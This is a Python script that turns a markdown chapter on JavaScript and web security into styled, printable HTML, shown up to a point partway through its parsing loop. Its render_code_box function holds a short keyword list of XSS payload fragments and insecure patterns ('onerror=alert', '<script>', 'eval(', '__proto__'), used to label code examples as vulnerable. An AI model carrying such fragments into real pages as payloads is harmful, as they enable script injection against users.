import re
import sys
import html
import os

# Ensure UTF-8 output
sys.stdout.reconfigure(encoding='utf-8')

# Read raw markdown
with open(r'c:\Users\User\Desktop\Note-Book\temp\ch-31.md', 'r', encoding='utf-8') as f:
    raw_md = f.read().replace('\r\n', '\n').replace('\r', '\n')

def inline_format(text):
    if not text:
        return ''
    text = html.escape(text)
    # Bold + Code
    text = re.sub(r'\*\*`([^`]+)`\*\*', r'<strong><code>\1</code></strong>', text)
    text = re.sub(r'`\*\*([^*]+)\*\*`', r'<strong><code>\1</code></strong>', text)
    # Bold
    text = re.sub(r'\*\*([^*]+)\*\*', r'<strong>\1</strong>', text)
    # Inline code
    text = re.sub(r'`([^`]+)`', r'<code>\1</code>', text)
    # Italic
    text = re.sub(r'(?<!\*)\*([^*\n]+)\*(?!\*)', r'<em>\1</em>', text)
    return text

def highlight_code(code_str, lang='javascript', is_invalid=False, is_correct=False):
    code_text = code_str.strip()
    esc_all = html.escape(code_text)
    
    if lang in ('javascript', 'js', 'jsx'):
        token_spec = [
            ('COMMENT_MULTI', r'/\*[\s\S]*?\*/'),
            ('COMMENT_LINE', r'//.*$'),
            ('REGEX_LIT', r'/(?:\\/|[^\n\r/])+/[gimsuy]*'),
            ('STRING_TMPL', r'`(?:\\.|[^`\\])*`'),
            ('STRING_DBL', r'"(?:\\.|[^"\\])*"'),
            ('STRING_SGL', r"'(?:\\.|[^'\\])*'"),
            ('KEYWORD', r'\b(?:for|while|do|break|continue|if|else|let|const|var|function|return|switch|case|default|of|in|new|typeof|delete|this|super|class|extends|static|instanceof|try|catch|finally|throw|await|async|yield|import|from|export)\b'),
            ('BOOL_NULL', r'\b(?:true|false|null|undefined|NaN)\b'),
            ('DOM_BUILTIN', r'\b(?:console|window|document|Math|Object|Array|Date|JSON|Promise|Error|Map|Set|WeakMap|WeakSet|setTimeout|clearTimeout|setInterval|clearInterval|fetch|location|localStorage|sessionStorage|DOMPurify|bcrypt|jwt|crypto)\b'),
            ('DOM_SINK', r'\b(?:innerHTML|outerHTML|document\.write|eval|Function)\b'),
            ('ASYNC_METHOD', r'\b(?:then|catch|finally|resolve|reject|addEventListener|removeEventListener|querySelector|getElementById|setItem|getItem|sign|verify|hash|compare)\b'),
            ('NUMBER', r'\b\d+(?:\.\d+)?\b'),
            ('OTHER', r'[^\s\w]+|\w+|\s+'),
        ]
        tok_regex = '|'.join(f'(?P<{name}>{pattern})' for name, pattern in token_spec)
        
        out = []
        for mo in re.finditer(tok_regex, code_text, flags=re.MULTILINE):
            kind = mo.lastgroup
            val = mo.group()
            esc = html.escape(val)
            
            if kind in ('COMMENT_MULTI', 'COMMENT_LINE'):
                out.append(f'<span class="syn-com">{esc}</span>')
            elif kind in ('STRING_TMPL', 'STRING_DBL', 'STRING_SGL'):
                out.append(f'<span class="syn-str">{esc}</span>')
            elif kind == 'KEYWORD':
                out.append(f'<span class="syn-kw">{esc}</span>')
            elif kind == 'BOOL_NULL':
                out.append(f'<span class="syn-bool">{esc}</span>')
            elif kind == 'DOM_SINK':
                out.append(f'<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">{esc}</span>')
            elif kind == 'DOM_BUILTIN':
                out.append(f'<span class="syn-fn">{esc}</span>')
            elif kind == 'ASYNC_METHOD':
                out.append(f'<span style="color: #38bdf8; font-weight: 600;">{esc}</span>')
            elif kind == 'NUMBER':
                out.append(f'<span class="syn-num">{esc}</span>')
            else:
                out.append(esc)
        highlighted = ''.join(out)
    elif lang == 'http':
        # Highlight HTTP headers & directives
        lines = esc_all.split('\n')
        hl_lines = []
        for line in lines:
            line = re.sub(r'^([A-Za-z0-9-]+:)', r'<span style="color: #38bdf8; font-weight: bold;">\1</span>', line)
            line = re.sub(r'\b(HttpOnly|Secure|SameSite=Strict|SameSite=Lax|SameSite=None|default-src|script-src|style-src|img-src|nosniff|DENY|SAMEORIGIN|max-age|includeSubDomains)\b', r'<span style="color: #4ade80; font-weight: bold;">\1</span>', line)
            line = re.sub(r'\b(unsafe-inline|unsafe-eval|\*)\b', r'<span style="color: #f87171; font-weight: bold;">\1</span>', line)
            hl_lines.append(line)
        highlighted = '\n'.join(hl_lines)
    elif lang == 'html':
        # Highlight HTML tags
        t = re.sub(r'(&lt;/?)([a-zA-Z0-9-]+)', r'<span style="color:#f472b6; font-weight:600;">\1\2</span>', esc_all)
        t = re.sub(r'\b(src|href|onerror|onload|onclick|action|method|type|value|name)=', r'<span style="color:#38bdf8;">\1=</span>', t)
        t = re.sub(r'(&gt;)', r'<span style="color:#f472b6; font-weight:600;">\1</span>', t)
        highlighted = t
    else:
        highlighted = esc_all
        
    return highlighted

def render_code_box(code_text, lang='javascript', title=None, is_invalid=False, is_correct=False):
    code_text = code_text.strip()
    
    # Auto-detect vulnerability vs secure mitigation
    if not is_invalid and not is_correct:
        if any(w in code_text for w in ['innerHTML = userInput', 'eval(', 'document.write(', '<script>', 'onerror=alert', 'javascript:', '__proto__', 'user.role === "admin"', 'SECRET_API_KEY']):
            if 'DOMPurify.sanitize' not in code_text and 'textContent' not in code_text and 'Object.create(null)' not in code_text:
                is_invalid = True
        elif any(w in code_text for w in ['textContent =', 'DOMPurify.sanitize', 'HttpOnly', 'Secure;', 'SameSite=Strict', 'Object.create(null)', 'Object.freeze(', 'bcrypt.hash', 'helmet()', 'rateLimit(']):
            is_correct = True

    highlighted = highlight_code(code_text, lang=lang, is_invalid=is_invalid, is_correct=is_correct)

    box_extra_cls = ''
    tag_color = '#94a3b8'
    tag_label = lang.upper()
    
    if is_invalid:
        box_extra_cls = ' code-box-error'
        tag_color = '#f87171'
        tag_label = '❌ Vulnerable / Attack Vector'
    elif is_correct:
        box_extra_cls = ' code-box-correct'
        tag_color = '#4ade80'
        tag_label = '✅ Secure / Mitigated Pattern'

    display_title = title if title else (f"{lang.upper()} Source")

    return f'''<div class="code-box{box_extra_cls}">
  <div class="code-top"><span style="color: {tag_color}; font-weight: 600;">{display_title}</span><span>{tag_label}</span></div>
  <pre><code>{highlighted}</code></pre>
</div>'''

def colorize_ascii(text):
    t = html.escape(text.strip())
    
    # 1. Colorize arrows & directional paths (Cyan / Sky Blue)
    t = re.sub(r'([↓↑→←▼▲►◄])', r'<span style="color: #38bdf8; font-weight: 700;">\1</span>', t)
    t = re.sub(r'(───+|──|─►|◄─)', r'<span style="color: #0ea5e9; font-weight: 600;">\1</span>', t)
    
    # 2. Colorize Box frames & connectors (Muted Slate)
    t = re.sub(r'([┌┐└┘├┤┬┴│┼]+)', r'<span style="color: #475569;">\1</span>', t)
    t = re.sub(r'(\-{3,})', r'<span style="color: #334155;">\1</span>', t)
    
    # 3. Colorize Attack Vectors & Vulnerabilities (Bright Crimson / Rose Red)
    t = re.sub(r'\b(XSS|CSRF|Attack|Attacker|Malicious|Exploit|Vulnerable|Injected|Stolen|Danger|Polluted|Prototype Pollution|Clickjacking|SQL Injection|eval\(\)|Leak|Untrusted|Unauthorized|Fake|Forgery)\b', r'<span style="color: #f43f5e; font-weight: 700;">\1</span>', t)
    t = re.sub(r'(✗|X)', r'<span style="color: #f43f5e; font-weight: bold;">\1</span>', t)
    
    # 4. Colorize Safe / Defended Nodes & Success (Bright Emerald / Neon Mint)
    t = re.sub(r'\b(Secure|Safe|Sanitized|HttpOnly|SameSite|Strict|Lax|Valid|Allowed|Cleaned|Protected|HTTPS|CSP|SOP|True|Encrypted|Hashed|HSTS|Defense|Safe Errors)\b', r'<span style="color: #34d399; font-weight: 700;">\1</span>', t)
    t = re.sub(r'(✓)', r'<span style="color: #4ade80; font-weight: bold;">✓</span>', t)
    
    # 5. Colorize Protocols, Origins & Endpoints (Amber / Gold)
    t = re.sub(r'\b(JWT|Bearer|Cookie|Set-Cookie|Origin|Header|CORS|Frontend|Backend|API|Database|Browser|Server|Client|User A|User B|User|Scheme|Host|Port)\b', r'<span style="color: #fde047; font-weight: 600;">\1</span>', t)
    
    # 6. Colorize Security Pillars & Stages (Lavender / Purple)
    t = re.sub(r'\b(Confidentiality|Integrity|Availability|CIA Triad|Authentication|Authorization|Validation|Sanitization|Rate Limit|Rate Limiting|Signature|Payload|Header|Session|Login)\b', r'<span style="color: #c084fc; font-weight: 700;">\1</span>', t)
    
    # 7. Colorize Numbers, Money & Hashes (Orange)
    t = re.sub(r'\b(10000|100,000|৳10,000|৳100,000|256-bit|bcrypt|argon2|\d+ms)\b', r'<span style="color: #fb923c; font-weight: 700;">\1</span>', t)
    
    return t

def render_ascii_box(text, title=None):
    if not title:
        # Determine dynamic title based on content keywords
        if 'CIA' in text or 'Confidentiality' in text:
            title = "CIA TRIAD SECURITY MATRIX"
        elif 'XSS' in text or 'script' in text.lower():
            title = "XSS INJECTION & EXECUTION PIPELINE"
        elif 'CSRF' in text or 'Forgery' in text:
            title = "CSRF FORGERY TRAP & DEFENSE ARCHITECTURE"
        elif 'CORS' in text or 'SOP' in text or 'Origin' in text:
            title = "SAME-ORIGIN POLICY & CORS ACCESS CONTROL"
        elif 'JWT' in text or 'Signature' in text:
            title = "JWT 3-PART STRUCTURE & TOKEN VERIFICATION"
        elif 'Cookie' in text or 'HttpOnly' in text:
            title = "COOKIE SECURITY FLAGS & TRANSMISSION SPEC"
        elif 'User' in text and 'Frontend' in text and 'API' in text:
            title = "MULTI-TIER WEB SECURITY FLOW"
        elif 'Prototype' in text or 'pollution' in text.lower():
            title = "PROTOTYPE POLLUTION OBJECT CHAIN VECTOR"
        else:
            title = "SECURITY ARCHITECTURE & DEFENSE DIAGRAM"
            
    colorized = colorize_ascii(text)
    return f'''<div class="ascii-tree-container">
  <div class="ascii-tree-header">🛡️ {title}</div>
  <pre class="ascii-tree-content">{colorized}</pre>
</div>'''

def render_output_box(text):
    text = html.escape(text.strip())
    return f'''<div class="code-box output-box">
  <div class="code-top"><span class="out-label">▶ SYSTEM / CONSOLE LOG</span><span>Security Log</span></div>
  <pre>{text}</pre>
</div>'''

def render_table(table_md):
    lines = [l.strip() for l in table_md.strip().split('\n') if l.strip()]
    if len(lines) < 2:
        return ''
    
    headers = [c.strip() for c in lines[0].strip('|').split('|')]
    rows = []
    for l in lines[2:]:
        cols = [c.strip() for c in l.strip('|').split('|')]
        rows.append(cols)
        
    th_html = ''.join(f'<th>{inline_format(h)}</th>' for h in headers)
    tr_html = []
    for r in rows:
        tds = ''.join(f'<td>{inline_format(c)}</td>' for c in r)
        tr_html.append(f'<tr>{tds}</tr>')
        
    return f'''<div class="table-container">
  <table class="master-table">
    <thead>
      <tr>{th_html}</tr>
    </thead>
    <tbody>
      {''.join(tr_html)}
    </tbody>
  </table>
</div>'''

# Part Banners configuration for Chapter 31 (12 Comprehensive Parts)
PART_BANNERS = {
    1: ("Part 01", "Web Security Fundamentals, CIA Triad & Input Validation (31.1 – 31.6)"),
    7: ("Part 02", "Cross-Site Scripting (XSS) Attacks, DOM Sinks & CSP Defense (31.7 – 31.15)"),
    16: ("Part 03", "Cross-Site Request Forgery (CSRF) & SameSite Protection (31.16 – 31.19)"),
    20: ("Part 04", "Same-Origin Policy (SOP), Cross-Origin Resource Sharing (CORS) (31.20 – 31.26)"),
    27: ("Part 05", "Cookie Security Flags, Storage Secrets & localStorage vs Cookies (31.27 – 31.31)"),
    32: ("Part 06", "JSON Web Tokens (JWT) Architecture, Cryptography & Session Security (31.32 – 31.35)"),
    36: ("Part 07", "Dangerous Execution: eval(), DOM Sinks & Prototype Pollution (31.36 – 31.43)"),
    44: ("Part 08", "Network Security: Clickjacking, HTTPS & Transport Layer Defense (31.44 – 31.47)"),
    48: ("Part 09", "API Security, Authentication vs Authorization & Info Leakage (31.48 – 31.53)"),
    54: ("Part 10", "Password Hashing, Secrets Management & HTTP Security Headers (31.54 – 31.60)"),
    61: ("Part 11", "Layered Defense, Supply Chain Audits & Secure Coding Mindset (31.61 – 31.70)"),
    71: ("Part 12", "Quick Cheat Sheet, 10 Golden Security Rules & Hands-On Practice Lab"),
}

# Split markdown into sections
raw_sections = re.split(r'\n(?=# 31\.\d+ )', raw_md)
print(f"Total raw section chunks parsed: {len(raw_sections)}")

html_parts = []

# Document Header & CSS Tokens
html_parts.append('''<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chapter 31 — JavaScript Security &amp; Web Security | JavaScript Master Study Documentation</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Hind+Siliguri:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --navy-deep: #0f172a;
      --navy-mid: #1e293b;
      --navy-light: #334155;
      --blue-accent: #0284c7;
      --blue-light: #e0f2fe;
      --blue-dark: #0369a1;
      --emerald: #059669;
      --amber: #d97706;
      --rose: #e11d48;
      --bg-page: #f8fafc;
      --bg-card: #ffffff;
      --border-card: #e2e8f0;
      --text-main: #0f172a;
      --text-muted: #64748b;
      --font-bengali: 'Hind Siliguri', sans-serif;
      --font-heading: 'Plus Jakarta Sans', sans-serif;
      --font-code: 'Fira Code', monospace;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-page);
      color: var(--text-main);
      font-family: var(--font-bengali);
      font-size: 11px;
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
    }

    /* Print Controls */
    .action-bar {
      position: sticky;
      top: 0;
      z-index: 1000;
      background: #0f172a;
      padding: 8px 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #334155;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    .brand-title {
      font-family: var(--font-heading);
      font-weight: 700;
      font-size: 12px;
      color: #f8fafc;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .print-btn {
      background: linear-gradient(135deg, #0284c7, #0369a1);
      color: #ffffff;
      border: none;
      padding: 5px 12px;
      border-radius: 5px;
      font-family: var(--font-heading);
      font-size: 10px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: all 0.2s ease;
      box-shadow: 0 2px 6px rgba(2, 132, 199, 0.3);
    }
    .print-btn:hover {
      background: linear-gradient(135deg, #0369a1, #075985);
      transform: translateY(-1px);
    }

    /* Container */
    .doc-page {
      max-width: 860px;
      margin: 14px auto;
      background: white;
      padding: 20px 26px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
      border-radius: 8px;
    }

    /* Master Banner (Classic 1-10 Blue Gradient + Official JS Yellow Badge & Prominent Chapter Title) */
    .master-banner {
      background: linear-gradient(135deg, #075985 0%, #0369a1 50%, #0284c7 100%);
      color: white;
      padding: 12px 16px;
      border-radius: 8px;
      margin-bottom: 8px;
      box-shadow: 0 4px 12px rgba(3, 105, 161, 0.2);
    }
    .banner-top {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 4px;
    }
    .banner-icon {
      background: #f7df1e;
      color: #000000;
      font-family: var(--font-heading);
      font-weight: 800;
      font-size: 13px;
      padding: 2px 7px;
      border-radius: 4px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.25);
    }
    .banner-title-group {
      display: flex;
      align-items: center;
      gap: 8px;
      flex-wrap: wrap;
    }
    .banner-title {
      font-family: var(--font-heading);
      font-size: 13px;
      font-weight: 700;
      letter-spacing: 0.5px;
      color: #ffffff;
    }
    .chapter-badge {
      background: #f7df1e;
      color: #000000;
      font-family: var(--font-heading);
      font-size: 12px;
      font-weight: 800;
      padding: 2px 8px;
      border-radius: 4px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
      letter-spacing: 0.5px;
    }
    .banner-sub {
      font-size: 9.5px;
      opacity: 0.95;
      font-weight: 500;
      letter-spacing: 0.3px;
      margin-bottom: 8px;
      color: #e0f2fe;
    }
    .meta-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
      background: rgba(15, 23, 42, 0.35);
      padding: 6px 10px;
      border-radius: 6px;
      border: 1px solid rgba(255, 255, 255, 0.12);
    }
    .meta-item {
      font-size: 8.5px;
    }
    .meta-label {
      color: #93c5fd;
      text-transform: uppercase;
      font-weight: 600;
      font-size: 7.5px;
      letter-spacing: 0.5px;
    }
    .meta-val {
      font-weight: 600;
      color: #ffffff;
    }

    /* Chapter Opening Statement Card */
    .opening-card {
      background: #f0f9ff;
      border: 1px solid #bae6fd;
      border-left: 3px solid var(--blue-accent);
      border-radius: 6px;
      padding: 8px 12px;
      margin-bottom: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
    }
    .opening-title {
      font-family: var(--font-heading);
      font-size: 11.5px;
      font-weight: 700;
      color: var(--blue-dark);
      margin-bottom: 4px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .roadmap-grid {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 4px;
      margin-top: 5px;
      padding-top: 5px;
      border-top: 1px dashed #bae6fd;
    }
    .roadmap-item {
      background: white;
      border: 1px solid #e0f2fe;
      border-radius: 4px;
      padding: 3px 5px;
      font-size: 8.5px;
      color: #0369a1;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 3px;
    }

    /* Part Banners */
    .part-banner {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #ffffff;
      font-family: var(--font-heading);
      font-size: 10px;
      font-weight: 700;
      letter-spacing: 0.6px;
      padding: 5px 10px;
      border-radius: 5px;
      margin: 8px 0 6px 0;
      border-left: 3px solid #38bdf8;
      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
      page-break-after: avoid !important;
      break-after: avoid !important;
      page-break-inside: avoid !important;
      break-inside: avoid !important;
    }

    /* Study Cards */
    .study-card {
      background: #ffffff;
      border: 1px solid var(--border-card);
      border-radius: 6px;
      padding: 8px 11px;
      margin-bottom: 7px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
      page-break-inside: avoid !important;
      break-inside: avoid !important;
    }
    .card-title {
      font-family: var(--font-heading);
      font-size: 11px;
      font-weight: 700;
      color: var(--navy-deep);
      margin-bottom: 5px;
      display: flex;
      align-items: center;
      gap: 6px;
      border-bottom: 1px solid #f1f5f9;
      padding-bottom: 3px;
    }
    .badge-num {
      background: var(--blue-accent);
      color: white;
      font-size: 9px;
      font-weight: 700;
      padding: 1px 5px;
      border-radius: 3px;
      font-family: var(--font-code);
    }

    /* Typography inside cards */
    .text-p {
      margin-bottom: 4px;
      color: #334155;
      font-size: 10.5px;
      line-height: 1.45;
    }
    .section-subhead {
      font-family: var(--font-heading);
      font-size: 10.5px;
      font-weight: 700;
      color: var(--navy-light);
      margin-top: 4px;
      margin-bottom: 3px;
      display: flex;
      align-items: center;
      gap: 4px;
    }
    .def-box {
      background: #f8fafc;
      border-left: 3px solid #64748b;
      padding: 5px 8px;
      border-radius: 0 4px 4px 0;
      font-size: 10px;
      margin: 4px 0;
      color: #334155;
    }
    .warn-box {
      background: #fff1f2;
      border-left: 3px solid #f43f5e;
      padding: 5px 8px;
      border-radius: 0 4px 4px 0;
      font-size: 10px;
      margin: 4px 0;
      color: #9f1239;
    }

    /* Code Blocks */
    .code-box {
      background: #0f172a;
      border-radius: 5px;
      margin: 4px 0 5px 0;
      overflow: hidden;
      border: 1px solid #1e293b;
      page-break-inside: avoid !important;
      break-inside: avoid !important;
    }
    .code-box-error {
      border: 1px solid rgba(239, 68, 68, 0.4);
      border-left: 3px solid #ef4444;
    }
    .code-box-correct {
      border: 1px solid rgba(34, 197, 94, 0.4);
      border-left: 3px solid #22c55e;
    }
    .code-top {
      background: #1e293b;
      color: #94a3b8;
      font-family: var(--font-code);
      font-size: 8.5px;
      padding: 2.5px 8px;
      display: flex;
      justify-content: space-between;
      border-bottom: 1px solid #334155;
      text-transform: uppercase;
    }
    .code-box pre {
      margin: 0;
      padding: 6px 10px;
      overflow-x: hidden !important;
      white-space: pre-wrap !important;
      word-break: break-word !important;
    }
    .code-box code {
      font-family: var(--font-code);
      font-size: 9px;
      line-height: 1.35;
      color: #f1f5f9;
      white-space: pre-wrap !important;
      word-break: break-word !important;
    }
    .syn-kw { color: #f472b6; font-weight: 600; }
    .syn-fn { color: #38bdf8; font-weight: 600; }
    .syn-str { color: #4ade80; }
    .syn-num { color: #fb923c; }
    .syn-com { color: #64748b; font-style: italic; }
    .syn-bool { color: #c084fc; font-weight: 600; }

    /* Output Box */
    .output-box {
      background: #182234;
      border-left: 3px solid #10b981;
    }
    .out-label {
      color: #34d399;
      font-weight: 700;
    }

    /* ASCII Diagrams with Pre & White-space: Pre & Colorful Highlights */
    .ascii-tree-container {
      background: #090d16;
      border: 1px solid #1e293b;
      border-radius: 6px;
      margin: 5px 0;
      overflow: hidden;
      box-shadow: 0 2px 6px rgba(0,0,0,0.18);
      page-break-inside: avoid !important;
      break-inside: avoid !important;
    }
    .ascii-tree-header {
      background: #111c2e;
      color: #38bdf8;
      font-family: var(--font-code);
      font-size: 9px;
      font-weight: 700;
      padding: 4px 10px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      border-bottom: 1px solid #1e293b;
    }
    .ascii-tree-content {
      color: #e2e8f0 !important;
      font-family: var(--font-code) !important;
      font-size: 9.5px !important;
      line-height: 1.35 !important;
      padding: 8px 12px !important;
      background: transparent !important;
      border: none !important;
      white-space: pre !important;
      overflow-x: hidden !important;
      word-break: normal !important;
      margin: 0 !important;
    }

    /* Practice Lab Items */
    .practice-item {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-left: 3px solid var(--blue-accent);
      border-radius: 5px;
      padding: 6px 9px;
      margin-bottom: 6px;
      page-break-inside: avoid !important;
      break-inside: avoid !important;
    }

    /* Master Tables */
    .table-container {
      margin: 6px 0;
      border-radius: 6px;
      overflow: hidden;
      border: 1px solid #e2e8f0;
    }
    .master-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 9.5px;
    }
    .master-table th {
      background: #1e293b;
      color: #f8fafc;
      font-weight: 700;
      padding: 5px 8px;
      text-align: left;
      border-bottom: 1px solid #334155;
    }
    .master-table td {
      padding: 5px 8px;
      border-bottom: 1px solid #f1f5f9;
      color: #334155;
    }
    .master-table tr:nth-child(even) {
      background: #f8fafc;
    }

    /* Print Optimization Rules */
    @page {
      size: A4;
      margin: 8mm 10mm;
    }

    @media print {
      body {
        background: white !important;
        font-size: 10px !important;
      }
      .action-bar {
        display: none !important;
      }
      .doc-page {
        max-width: 100% !important;
        margin: 0 !important;
        padding: 0 !important;
        border: none !important;
        box-shadow: none !important;
      }
      #sec-31-1 {
        page-break-after: always !important;
        break-after: page !important;
        margin-bottom: 0 !important;
      }
      .study-card, .practice-item {
        page-break-inside: avoid !important;
        break-inside: avoid !important;
        border: 1px solid #cbd5e1;
      }
      .part-banner {
        page-break-after: avoid !important;
        break-after: avoid !important;
      }
      .code-box, pre, .ascii-tree-container, .table-container, .def-box, .output-box, .warn-box {
        page-break-inside: avoid !important;
        break-inside: avoid !important;
      }
      pre {
        overflow-x: hidden !important;
        white-space: pre-wrap !important;
        word-break: break-word !important;
      }
    }
  </style>
</head>
<body>

  <!-- Sticky Top Print Nav -->
  <div class="action-bar">
    <div class="brand-title">
      <span style="color:#f7df1e; font-weight:800; font-family:var(--font-code); background:#000; padding:1px 4px; border-radius:3px;">JS</span> MASTER STUDY DOCUMENTATION
    </div>
    <button class="print-btn" onclick="window.print()">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
      Print / Save as PDF
    </button>
  </div>

  <div class="doc-page">

    <!-- Header Master Banner (Classic 1-10 Style + JS Yellow & Prominent Chapter Title) -->
    <header class="master-banner">
      <div class="banner-top">
        <div class="banner-icon">JS</div>
        <div class="banner-title-group">
          <span class="banner-title">JavaScript Master Study Documentation</span>
          <span class="chapter-badge">Chapter 31</span>
        </div>
      </div>
      <div class="banner-sub">JAVASCRIPT SECURITY, WEB ATTACK VECTORS &amp; DEFENSIVE RUNTIME ARCHITECTURE</div>
      <div class="meta-grid">
        <div class="meta-item">
          <div class="meta-label">Total Modules</div>
          <div class="meta-val">70 Modules + Practice Lab</div>
        </div>
        <div class="meta-item">
          <div class="meta-label">Curriculum Part</div>
          <div class="meta-val">Part 25 — Web &amp; JS Security</div>
        </div>
        <div class="meta-item">
          <div class="meta-label">Core Mechanics</div>
          <div class="meta-val">XSS, CSRF, CORS, CSP, JWT &amp; SOP</div>
        </div>
        <div class="meta-item">
          <div class="meta-label">Reference Standard</div>
          <div class="meta-val">OWASP Top 10 / W3C WebAppSec / RFC 6749</div>
        </div>
      </div>
    </header>

    <!-- Chapter Opening Statement (Page 1 Balance) -->
    <div class="opening-card">
      <div class="opening-title">
        <span>🛡️</span> JavaScript Security &amp; Web Security — ডিফেন্সিভ আর্কিটেকচার শেখার মূল উদ্দেশ্য
      </div>
      <p class="text-p">
        JavaScript দিয়ে শুধু ওয়েবসাইট বানালেই হবে না—<strong>Website-এর Data, User Account, API, Authentication এবং Browser Interaction কীভাবে নিরাপদ রাখা যায়</strong> সেটাও একজন পেশাদার ইঞ্জিনিয়ারের জানা বাধ্যতামূলক। এই চ্যাপ্টারে আমরা <strong>XSS, CSRF, CORS, CSP, Secure Cookies, JWT, Prototype Pollution, Clickjacking, HTTPS</strong> এবং আধুনিক মাল্টি-লেয়ার ডিফেন্স সিস্টেম গভীরভাবে শিখব।
      </p>
      <div class="roadmap-grid">
        <div class="roadmap-item"><span>📌</span> 1. CIA Triad</div>
        <div class="roadmap-item"><span>📌</span> 2. Auth vs AuthZ</div>
        <div class="roadmap-item"><span>📌</span> 3. XSS Sinks</div>
        <div class="roadmap-item"><span>📌</span> 4. CSRF Traps</div>
        <div class="roadmap-item"><span>📌</span> 5. SOP &amp; CORS</div>
        <div class="roadmap-item"><span>📌</span> 6. HttpOnly Cookies</div>
        <div class="roadmap-item"><span>📌</span> 7. JWT Security</div>
        <div class="roadmap-item"><span>📌</span> 8. Prototype Pollution</div>
        <div class="roadmap-item"><span>📌</span> 9. Secure Headers</div>
        <div class="roadmap-item"><span>📌</span> 10. Multi-Layer Defense</div>
      </div>
    </div>
''')

# Function to get part banner if applicable
def check_part_banner(sec_idx):
    if sec_idx in PART_BANNERS:
        part_tag, part_title = PART_BANNERS[sec_idx]
        return f'<div class="part-banner">{part_tag} — {part_title}</div>'
    return None

# Parse Sections 1 to 69
for idx in range(1, 70):
    sec_text = raw_sections[idx].strip()
    pb = check_part_banner(idx)
    if pb:
        html_parts.append(f'    {pb}\n')
        
    sec_lines = sec_text.split('\n')
    header_line = sec_lines[0]
    m_head = re.search(r'# (?:🔥\s*)?(31\.\d+)\s*(?:—|-)?\s*(.*)', header_line)
    if m_head:
        sec_num = m_head.group(1)
        sec_title = m_head.group(2)
    else:
        sec_num = f'31.{idx}'
        sec_title = header_line.replace('#', '').strip()
        
    card_extra = ''
    if idx == 1:
        card_extra = ' id="sec-31-1"'
        
    html_parts.append(f'''    <div class="study-card"{card_extra}>
      <div class="card-title"><span class="badge-num">{sec_num}</span> {inline_format(sec_title)}</div>
''')
    
    body_text = '\n'.join(sec_lines[1:]).strip()
    
    # State-machine parsing for code blocks and text
    body_lines = body_text.split('\n')
    in_code = False
    cur_lang = ''
    code_lines = []
    p_acc = []
    in_list = False
    
    for l in body_lines:
        ls = l.strip()
        
        # Check code fence
        if ls.startswith('```'):
            if not in_code:
                # Flush text accumulator before entering code
                if in_list:
                    html_parts.append('      </ul>\n')
                    in_list = False
                if p_acc:
                    p_text = " ".join(p_acc).strip()
                    if p_text and p_text != '---':
                        html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
                    p_acc = []
                in_code = True
                cur_lang = ls[3:].strip().lower()
                code_lines = []
            else:
                # Closing code block
                in_code = False
                code_content = '\n'.join(code_lines)
                if cur_lang in ('javascript', 'js', 'jsx'):
                    html_parts.append(f'      {render_code_box(code_content, lang="javascript")}\n')
                elif cur_lang == 'html':
                    html_parts.append(f'      {render_code_box(code_content, lang="html", title="HTML INJECTION VECTOR")}\n')
                elif cur_lang == 'http':
                    html_parts.append(f'      {render_code_box(code_content, lang="http", title="HTTP RESPONSE HEADERS")}\n')
                elif cur_lang == 'bash':
                    html_parts.append(f'      {render_code_box(code_content, lang="bash", title="CLI COMMAND")}\n')
                else: # text or empty
                    html_parts.append(f'      {render_ascii_box(code_content)}\n')
            continue
            
        if in_code:
            code_lines.append(l)
            continue
            
        # Outside code fence
        if not ls:
            continue
        if ls == '---' or ls.startswith('---') or ls == '***':
            continue
        if ls.endswith('---'):
            ls = ls[:-3].strip()
        if not ls:
            continue
            
        if ls.startswith('### '):
            if in_list:
                html_parts.append('      </ul>\n')
                in_list = False
            if p_acc:
                p_text = " ".join(p_acc).strip()
                if p_text and p_text != '---':
                    html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
                p_acc = []
            sub_title = ls[4:].strip()
            html_parts.append(f'      <div class="section-subhead">🔹 {inline_format(sub_title)}</div>\n')
        elif ls.startswith('## '):
            if in_list:
                html_parts.append('      </ul>\n')
                in_list = False
            if p_acc:
                p_text = " ".join(p_acc).strip()
                if p_text and p_text != '---':
                    html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
                p_acc = []
            sub_title = ls[3:].strip()
